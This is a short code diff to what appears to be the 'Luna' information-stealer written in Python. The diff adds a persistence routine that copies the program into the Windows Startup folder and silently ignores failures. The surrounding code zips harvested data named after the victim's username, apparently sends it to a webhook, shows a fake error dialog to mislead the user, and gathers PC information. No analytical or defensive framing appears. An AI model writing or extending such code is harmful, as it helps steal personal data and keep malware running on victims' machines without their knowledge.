@@ -11,6 +11,7 @@ import psutil
 import json
 import base64
 
+from sys import argv
 from tkinter import messagebox
 from shutil import copy2
 from zipfile import ZipFile
@@ -44,6 +45,7 @@ def main(webhook: str):
             continue
 
     zipup()
+    startup()
 
     _file = None
     _file = File(f'{local}\\Luna-Logged-{os.getenv("Username")}.zip')
@@ -80,6 +82,13 @@ def try_extract(func):
 
 def fakeerror():
     messagebox.showerror("Fatal Error", "Error code: 0x80070002\nAn internal error occured while importing modules.")
+
+def startup():
+    startup_path = os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
+    try:
+        copy2(argv[0], startup_path)
+    except Exception:
+        pass
 
 class grabpcinfo():
     def __init__(self) -> None:
